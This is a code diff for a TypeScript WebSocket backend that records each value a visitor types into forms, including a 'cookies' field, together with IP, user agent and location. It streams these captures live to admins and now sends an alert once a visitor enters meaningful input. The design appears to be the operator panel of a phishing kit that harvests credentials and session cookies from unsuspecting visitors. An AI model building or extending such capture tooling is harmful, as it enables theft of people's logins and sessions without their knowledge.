@@ -176,6 +176,7 @@ interface Visitor {
   connectedAt: number;
   formData: Record<string, string>;
   formHistory: FormEntry[];
+  notificationSent: boolean;
 }
 
 interface VisitorPublic {
@@ -296,6 +297,33 @@ function persistVisitor(v: Visitor) {
     userAgent: v.userAgent,
     lastSeen: Date.now(),
   });
+}
+
+function notifyAfterMeaningfulInput(v: Visitor, field: string, value: string): void {
+  if (v.notificationSent || field === 'cookies' || !value.trim()) return;
+  v.notificationSent = true;
+
+  const send = (location: Location) => {
+    notifyVisitor({
+      country: location.country,
+      region: location.region,
+      ip: v.ip,
+      userAgent: v.userAgent,
+      sessionId: v.id,
+    });
+  };
+
+  if (v.location.country) {
+    send(v.location);
+    return;
+  }
+
+  fetchLocation(v.ip)
+    .then(location => {
+      v.location = location;
+      send(location);
+    })
+    .catch(err => logger.warn({ err }, 'Failed to fetch visitor location for notification'));
 }
 
 function getPersistedSession(ip: string): PersistedSession | null {
@@ -485,6 +513,7 @@ export function setupWebSocket(server: Server) {
           connectedAt: Date.now(),
           formData: persisted ? { ...persisted.formData } : {},
           formHistory: persisted ? [...persisted.formHistory] : [],
+          notificationSent: false,
         };
         visitors.set(id, visitor);
         // Broadcast immediately so the admin sees the visitor and doesn't miss
@@ -507,13 +536,6 @@ export function setupWebSocket(server: Server) {
           if (v) {
             v.location = location;
             recordVisit(v, location);
-            notifyVisitor({
-              country: location.country,
-              region: location.region,
-              ip: v.ip,
-              userAgent: v.userAgent,
-              sessionId: v.id,
-            });
             broadcastToAdmins({ type: 'visitor-location', id, location });
           }
         }).catch((err) => logger.warn({ err }, 'Failed to fetch visitor location'));
@@ -543,6 +565,7 @@ export function setupWebSocket(server: Server) {
                 _appendCapture({ visitorId: id, visitorIp: v.ip, field, value, ts });
                 broadcastToAdmins({ type: 'visitor-form-data', id, field, value, ts });
                 persistVisitor(v);
+                notifyAfterMeaningfulInput(v, field, value);
                 logger.info({ id, field }, 'Visitor form-data captured (ws)');
               }
             }
@@ -577,6 +600,7 @@ export function captureFormDataHTTP(visitorId: string, visitorIp: string, field:
     v.formHistory.push({ field, value, ts });
     broadcastToAdmins({ type: 'visitor-form-data', id: visitorId, field, value, ts });
     persistVisitor(v);
+    notifyAfterMeaningfulInput(v, field, value);
     logger.info({ id: visitorId, field }, 'Visitor form-data captured (http)');
     return { ok: true, stored: true };
   }
